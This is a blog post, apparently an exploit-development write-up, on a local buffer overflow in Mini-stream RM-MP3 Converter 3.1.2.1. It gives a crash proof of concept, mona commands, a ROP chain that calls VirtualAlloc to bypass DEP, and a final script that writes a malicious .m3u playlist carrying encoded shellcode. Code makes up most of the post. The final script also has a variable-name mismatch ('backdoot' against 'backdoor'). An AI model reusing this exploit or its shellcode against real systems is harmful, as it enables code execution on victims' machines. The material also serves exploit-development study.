---
layout:     post
title:      Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30 - Local Buffer Overflow
author:     wooy0ung
tags:       bof
category:   exploit
---

- INDEX
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 sp0  
>host machine: Windows 10  
>vulnerability application: Mini-stream RM-MP3 Converter 3.1.2.1  
<!-- more -->


## 0x001 Test POC

Execute the POC, EIP would be overwrite by 0x42424242.
```
#!/usr/bin/python
import sys, struct

file="crash.m3u"
 
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "B"*4 + "C"*7572

writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x001.png)

I try to find out a module withou all protection.
```
!mona modules
```

Fortunately, there is a module that matches.
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x002.png)

Generate a ROPgadget list should be helpful to us.
```
!mona ropfunc -m MSRMfilter03.dll -cp b'\x00\x09\x0a'
```
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x003.png)

Or we even can generate rop chain, thanks to corelanc0d3r!
```
!mona rop -m MSRMfilter03.dll -cp b'\x00\x09\x0a'
```
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x004.png)


## 0x002 Exploit it!

First, overwrite retAddr with a "ret" instruction.
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x005.png)
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x006.png)

I choose 0x10013483 this time.
```
#!/usr/bin/python
import sys, struct

file="crash.m3u"

rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10013483 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "\x83\x34\x01\x10" + rop + "C"*(7572-len(rop))

writeFile = open(file, "w")
writeFile.write(crash)
writeFile.close()
```

Padding! Please learn about VirtualAlloc.
```
LPVOID WINAPI VirtualAlloc(
  _In_opt_ LPVOID lpAddress,
  _In_     SIZE_T dwSize,
  _In_     DWORD  flAllocationType,
  _In_     DWORD  flProtect
);
```

Next step, I try to call VirtualAlloc method.
```
rop = struct.pack('<L',0x41414141)
rop += struct.pack('<L',0x1002be41)	# POP EDI # RETN
rop += struct.pack('<L',0x10013483)	# ROP nop

rop += struct.pack('<L',0x10029f02)	# POP ECX # RETN
rop += struct.pack('<L',0xffffffff)	# -1
rop += struct.pack('<L',0x1002e01b)	# INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN	0
rop += struct.pack('<L',0x1002e01b)	# INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN	1
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	2
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	4
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	8
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	16
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	32
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	64 --> 0x40

rop += struct.pack('<L',0x10031912)	# POP EAX # RETN
rop += struct.pack('<L',0x1005d060)	# kernel32.virtualalloc ptr
rop += struct.pack('<L',0x10027f59)	# MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e)	# PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN

rop += struct.pack('<L',0x1002d3c3)	# POP EDX # RETN
rop += struct.pack('<L',0x66666666)
rop += struct.pack('<L',0x10019ee8)	# POP EBX # RETN
rop += struct.pack('<L',0x9999a99a)
rop += struct.pack('<L',0x10029f3e)	# ADD EDX,EBX # POP EBX # RETN 0x10		0x66666666 + 0x9999a99a = 0x100001000
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)

rop += struct.pack('<L',0x10035131)	# POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP

rop += struct.pack('<L',0x10019ee8)	# POP EBX # RETN
rop += struct.pack('<L',0xffffffff)
rop += struct.pack('<L',0x100319d3)	# INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3)	# INC EBX # FPATAN # RETN

rop += struct.pack('<L',0x10031912)	# POP EAX # RETN
rop += struct.pack('<L',0x90909090)

rop += struct.pack('<L',0x10014720) # PUSHAD # RETN
```

Now I'm successfully setting the argument of VirtualAlloc metod.
```
LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
```
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x007.png)

Win~
```
#!/usr/bin/python
import sys, struct

file="exp.m3u"


rop = struct.pack('<L',0x41414141)
rop += struct.pack('<L',0x1002be41)	# POP EDI # RETN
rop += struct.pack('<L',0x10013483)	# ROP nop

rop += struct.pack('<L',0x10029f02)	# POP ECX # RETN
rop += struct.pack('<L',0xffffffff)	# -1
rop += struct.pack('<L',0x1002e01b)	# INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN	0
rop += struct.pack('<L',0x1002e01b)	# INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN	1
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	2
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	4
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	8
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	16
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	32
rop += struct.pack('<L',0x1002a487)	# ADD ECX,ECX # RETN	64 --> 0x40

rop += struct.pack('<L',0x10031912)	# POP EAX # RETN
rop += struct.pack('<L',0x1005d060)	# kernel32.virtualalloc ptr
rop += struct.pack('<L',0x10027f59)	# MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e)	# PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN

rop += struct.pack('<L',0x1002d3c3)	# POP EDX # RETN
rop += struct.pack('<L',0x66666666)
rop += struct.pack('<L',0x10019ee8)	# POP EBX # RETN
rop += struct.pack('<L',0x9999a99a)
rop += struct.pack('<L',0x10029f3e)	# ADD EDX,EBX # POP EBX # RETN 0x10		0x66666666 + 0x9999a99a = 0x100001000
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)
rop += struct.pack('<L',0x10013483)

rop += struct.pack('<L',0x10035131)	# POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP

rop += struct.pack('<L',0x10019ee8)	# POP EBX # RETN
rop += struct.pack('<L',0xffffffff)
rop += struct.pack('<L',0x100319d3)	# INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3)	# INC EBX # FPATAN # RETN

rop += struct.pack('<L',0x10031912)	# POP EAX # RETN
rop += struct.pack('<L',0x90909090)

rop += struct.pack('<L',0x10014720) # PUSHAD # RETN


buf =  ""
buf += "\xba\xd5\xf6\x2f\x9c\xdb\xd4\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x56\x31\x56\x13\x03\x56\x13\x83\xc6\xd1\x14"
buf += "\xda\x60\x31\x5a\x25\x99\xc1\x3b\xaf\x7c\xf0\x7b\xcb"
buf += "\xf5\xa2\x4b\x9f\x58\x4e\x27\xcd\x48\xc5\x45\xda\x7f"
buf += "\x6e\xe3\x3c\xb1\x6f\x58\x7c\xd0\xf3\xa3\x51\x32\xca"
buf += "\x6b\xa4\x33\x0b\x91\x45\x61\xc4\xdd\xf8\x96\x61\xab"
buf += "\xc0\x1d\x39\x3d\x41\xc1\x89\x3c\x60\x54\x82\x66\xa2"
buf += "\x56\x47\x13\xeb\x40\x84\x1e\xa5\xfb\x7e\xd4\x34\x2a"
buf += "\x4f\x15\x9a\x13\x60\xe4\xe2\x54\x46\x17\x91\xac\xb5"
buf += "\xaa\xa2\x6a\xc4\x70\x26\x69\x6e\xf2\x90\x55\x8f\xd7"
buf += "\x47\x1d\x83\x9c\x0c\x79\x87\x23\xc0\xf1\xb3\xa8\xe7"
buf += "\xd5\x32\xea\xc3\xf1\x1f\xa8\x6a\xa3\xc5\x1f\x92\xb3"
buf += "\xa6\xc0\x36\xbf\x4a\x14\x4b\xe2\x02\xd9\x66\x1d\xd2"
buf += "\x75\xf0\x6e\xe0\xda\xaa\xf8\x48\x92\x74\xfe\xd9\xb4"
buf += "\x86\xd0\x61\xd4\x78\xd1\x91\xfc\xbe\x85\xc1\x96\x17"
buf += "\xa6\x8a\x66\x97\x73\x26\x6d\x0f\xbc\x1e\x71\x0c\x54"
buf += "\x5c\x72\xb1\x8d\xe9\x94\xe5\x9d\xb9\x08\x46\x4e\x79"
buf += "\xf9\x2e\x84\x76\x26\x4e\xa7\x5d\x4f\xe5\x48\x0b\x27"
buf += "\x92\xf1\x16\xb3\x03\xfd\x8d\xb9\x04\x75\x27\x3d\xca"
buf += "\x7e\x42\x2d\x3b\x19\xac\xad\xbc\x8c\xac\xc7\xb8\x06"
buf += "\xfb\x7f\xc3\x7f\xcb\xdf\x3c\xaa\x48\x27\xc2\x2b\x78"
buf += "\x53\xf5\xb9\xc4\x0b\xfa\x2d\xc4\xcb\xac\x27\xc4\xa3"
buf += "\x08\x1c\x97\xd6\x56\x89\x84\x4a\xc3\x32\xfc\x3f\x44"
buf += "\x5b\x02\x19\xa2\xc4\xfd\x4c\xb0\x03\x01\x12\x9f\xab"
buf += "\x69\xec\x9f\x4b\x69\x86\x1f\x1c\x01\x5d\x0f\x93\xe1"
buf += "\x9e\x9a\xfc\x69\x14\x4b\x4e\x08\x29\x46\x0e\x94\x2a"
buf += "\x65\x8b\x27\x50\x06\x2c\xc8\xa5\x0e\x49\xc9\xa5\x2e"
buf += "\x6f\xf6\x73\x17\x05\x39\x40\x2c\x16\x0c\xe5\x05\xbd"
buf += "\x6e\xb9\x56\x94"
backdoot = buf

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10013483 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = '\x90'*5 + backdoor
target = "http://." + "A"*17416 + "\x83\x34\x01\x10" + rop + shell + "C"*(7572-len(rop))

writeFile = open(file, "w")
writeFile.write(target)
writeFile.close()
```
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x008.png)
![](/assets/img/exploit/2018-08-14-mini-stream-rm-mp3-converter-3.1.2.1-local-buffer-overflow/0x009.png)